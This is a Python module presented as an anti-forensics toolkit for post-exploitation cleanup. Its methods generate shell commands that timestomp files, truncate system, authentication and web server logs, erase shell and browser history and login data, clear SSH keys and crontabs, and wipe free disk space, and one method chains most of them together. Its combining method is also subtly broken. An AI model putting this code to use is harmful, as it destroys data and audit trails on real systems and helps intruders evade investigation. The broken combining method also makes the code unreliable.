"""Anti-Forensics Module — timestomp, log cleanup, evidence removal."""

from __future__ import annotations
import subprocess
from dataclasses import dataclass
from typing import Any, Optional


@dataclass
class ForensicAction:
    """Anti-forensic action."""
    name: str
    command: str
    description: str
    risk_level: str  # safe, active, dangerous, critical
    reversible: bool
    evidence_level: str  # none, low, medium, high


class AntiForensics:
    """Anti-forensics toolkit for post-exploitation cleanup."""

    def __init__(self, config: Optional[dict] = None):
        self.config = config or {}

    def timestomp_file(self, target_file: str, reference_file: str = "/etc/passwd") -> dict[str, Any]:
        """Copy timestamps from reference file to target."""
        cmd = (
            f"touch -r {reference_file} {target_file} && "
            f"echo '[OK] Timestamps copied from {reference_file} to {target_file}'"
        )
        return {
            "command": cmd,
            "description": f"Timestomp {target_file} using {reference_file} as reference",
            "risk_level": "active",
            "reversible": False,
            "evidence_level": "low",
        }

    def timestomp_directory(self, target_dir: str, reference_file: str = "/etc/passwd") -> dict[str, Any]:
        """Timestomp all files in a directory."""
        cmd = (
            f"find {target_dir} -type f -exec touch -r {reference_file} {{}} \\; && "
            f"echo '[OK] Directory timestamps cleaned'"
        )
        return {
            "command": cmd,
            "description": f"Timestomp all files in {target_dir}",
            "risk_level": "active",
            "reversible": False,
            "evidence_level": "low",
        }

    def cleanup_bash_history(self) -> dict[str, Any]:
        """Clear bash history."""
        cmd = (
            "history -c && "
            "rm -f ~/.bash_history && "
            "rm -f /root/.bash_history && "
            "echo '[OK] Bash history cleared'"
        )
        return {
            "command": cmd,
            "description": "Clear all bash history",
            "risk_level": "active",
            "reversible": False,
            "evidence_level": "high",
        }

    def cleanup_syslog(self) -> dict[str, Any]:
        """Clean system logs."""
        cmd = (
            "truncate -s 0 /var/log/syslog 2>/dev/null; "
            "truncate -s 0 /var/log/auth.log 2>/dev/null; "
            "truncate -s 0 /var/log/secure 2>/dev/null; "
            "truncate -s 0 /var/log/messages 2>/dev/null; "
            "truncate -s 0 /var/log/kern.log 2>/dev/null; "
            "truncate -s 0 /var/log/cron 2>/dev/null; "
            "truncate -s 0 /var/log/daemon.log 2>/dev/null; "
            "truncate -s 0 /var/log/mail.log 2>/dev/null; "
            "truncate -s 0 /var/log/user.log 2>/dev/null; "
            "truncate -s 0 /var/log/lpr.log 2>/dev/null; "
            "echo '[OK] System logs truncated'"
        )
        return {
            "command": cmd,
            "description": "Truncate all system log files",
            "risk_level": "dangerous",
            "reversible": False,
            "evidence_level": "high",
        }

    def cleanup_web_logs(self, webroot: str = "/var/www/html") -> dict[str, Any]:
        """Clean web server access and error logs."""
        cmd = (
            "truncate -s 0 /var/log/apache2/access.log 2>/dev/null; "
            "truncate -s 0 /var/log/apache2/error.log 2>/dev/null; "
            "truncate -s 0 /var/log/nginx/access.log 2>/dev/null; "
            "truncate -s 0 /var/log/nginx/error.log 2>/dev/null; "
            "truncate -s 0 /var/log/httpd/access_log 2>/dev/null; "
            "truncate -s 0 /var/log/httpd/error_log 2>/dev/null; "
            "echo '[OK] Web server logs cleaned'"
        )
        return {
            "command": cmd,
            "description": "Clean web server access/error logs",
            "risk_level": "dangerous",
            "reversible": False,
            "evidence_level": "high",
        }

    def cleanup_auth_logs(self) -> dict[str, Any]:
        """Clean authentication-related logs."""
        cmd = (
            "truncate -s 0 /var/log/auth.log 2>/dev/null; "
            "truncate -s 0 /var/log/secure 2>/dev/null; "
            "truncate -s 0 /var/log/btmp 2>/dev/null; "
            "truncate -s 0 /var/log/wtmp 2>/dev/null; "
            "truncate -s 0 /var/log/faillog 2>/dev/null; "
            "truncate -s 0 /var/log/lastlog 2>/dev/null; "
            "utmpdump /dev/null > /var/log/wtmp 2>/dev/null; "
            "echo '[OK] Authentication logs cleaned'"
        )
        return {
            "command": cmd,
            "description": "Clean authentication and login logs",
            "risk_level": "dangerous",
            "reversible": False,
            "evidence_level": "high",
        }

    def cleanup_firefox(self) -> dict[str, Any]:
        """Clean Firefox browsing history and cache."""
        cmd = (
            "rm -rf ~/.mozilla/firefox/*.default*/places.sqlite && "
            "rm -rf ~/.mozilla/firefox/*.default*/formhistory.sqlite && "
            "rm -rf ~/.mozilla/firefox/*.default*/cookies.sqlite && "
            "rm -rf ~/.cache/mozilla/firefox/ && "
            "echo '[OK] Firefox data cleaned'"
        )
        return {
            "command": cmd,
            "description": "Remove Firefox browsing history, cookies, cache",
            "risk_level": "active",
            "reversible": False,
            "evidence_level": "high",
        }

    def cleanup_chromium(self) -> dict[str, Any]:
        """Clean Chromium/Chrome browsing data."""
        cmd = (
            "rm -rf ~/.config/chromium/Default/History && "
            "rm -rf ~/.config/chromium/Default/Cookies && "
            "rm -rf ~/.config/chromium/Default/Login\\ Data && "
            "rm -rf ~/.config/google-chrome/Default/History && "
            "rm -rf ~/.config/google-chrome/Default/Cookies && "
            "rm -rf ~/.cache/chromium/ && "
            "rm -rf ~/.cache/google-chrome/ && "
            "echo '[OK] Chromium/Chrome data cleaned'"
        )
        return {
            "command": cmd,
            "description": "Remove Chrome/Chromium browsing data",
            "risk_level": "active",
            "reversible": False,
            "evidence_level": "high",
        }

    def cleanup_temp_files(self) -> dict[str, Any]:
        """Clean temporary files and directories."""
        cmd = (
            "rm -rf /tmp/* /var/tmp/* /dev/shm/* 2>/dev/null; "
            "echo '[OK] Temporary files cleaned'"
        )
        return {
            "command": cmd,
            "description": "Remove all temporary files",
            "risk_level": "active",
            "reversible": False,
            "evidence_level": "medium",
        }

    def cleanup_recent_files(self) -> dict[str, Any]:
        """Clean recent files list and thumbnails."""
        cmd = (
            "rm -rf ~/.local/share/recently-used.xbel && "
            "rm -rf ~/.thumbnails/ && "
            "rm -rf ~/.local/share/RecentDocuments/ && "
            "echo '[OK] Recent files and thumbnails cleaned'"
        )
        return {
            "command": cmd,
            "description": "Remove recent files and thumbnail cache",
            "risk_level": "safe",
            "reversible": False,
            "evidence_level": "medium",
        }

    def remove_ssh_keys(self) -> dict[str, Any]:
        """Remove SSH authorized_keys entries."""
        cmd = (
            "> ~/.ssh/authorized_keys && "
            "echo '[OK] SSH authorized_keys cleared'"
        )
        return {
            "command": cmd,
            "description": "Clear SSH authorized_keys",
            "risk_level": "dangerous",
            "reversible": False,
            "evidence_level": "high",
        }

    def remove_crontabs(self) -> dict[str, Any]:
        """Remove malicious crontab entries."""
        cmd = "crontab -r 2>/dev/null; echo '[OK] User crontab removed'"
        return {
            "command": cmd,
            "description": "Remove current user crontab",
            "risk_level": "dangerous",
            "reversible": False,
            "evidence_level": "medium",
        }

    def wipe_free_space(self, target_dir: str = "/tmp") -> dict[str, Any]:
        """Wipe free space on disk."""
        cmd = (
            f"dd if=/dev/zero of={target_dir}/.wipe bs=1M 2>/dev/null; "
            f"dd if=/dev/urandom of={target_dir}/.wipe2 bs=1M 2>/dev/null; "
            f"rm -f {target_dir}/.wipe {target_dir}/.wipe2; "
            f"echo '[OK] Free space wiped on {target_dir}'"
        )
        return {
            "command": cmd,
            "description": f"Wipe free space on {target_dir}",
            "risk_level": "dangerous",
            "reversible": False,
            "evidence_level": "medium",
        }

    def full_cleanup(self) -> dict[str, Any]:
        """Full anti-forensic cleanup (all actions)."""
        actions = [
            self.cleanup_bash_history(),
            self.cleanup_syslog(),
            self.cleanup_auth_logs(),
            self.cleanup_web_logs(),
            self.cleanup_temp_files(),
            self.cleanup_recent_files(),
            self.cleanup_chromium(),
        ]
        combined_cmd = " && ".join(a["command"].split(" && ") for a in actions)
        return {
            "command": combined_cmd,
            "description": "Full anti-forensic cleanup (all logs, history, traces)",
            "risk_level": "critical",
            "reversible": False,
            "evidence_level": "none",
            "individual_actions": [a["description"] for a in actions],
        }

    def list_actions(self) -> list[dict[str, str]]:
        """List all available anti-forensic actions."""
        return [
            {"name": a.name, "description": a.description, "risk_level": a.risk_level}
            for a in [
                ForensicAction("timestomp", "", "Copy timestamps from reference file", "active", True, "low"),
                ForensicAction("bash_history", "", "Clear bash history", "active", False, "high"),
                ForensicAction("syslog", "", "Truncate system logs", "dangerous", False, "high"),
                ForensicAction("web_logs", "", "Clean web server logs", "dangerous", False, "high"),
                ForensicAction("auth_logs", "", "Clean authentication logs", "dangerous", False, "high"),
                ForensicAction("browser", "", "Clean browser data", "active", False, "high"),
                ForensicAction("temp", "", "Clean temp files", "active", False, "medium"),
                ForensicAction("ssh_keys", "", "Remove SSH keys", "dangerous", False, "high"),
                ForensicAction("crontabs", "", "Remove crontabs", "dangerous", False, "medium"),
                ForensicAction("wipe_free", "", "Wipe free disk space", "dangerous", False, "medium"),
                ForensicAction("full", "", "Full cleanup", "critical", False, "none"),
            ]
        ]
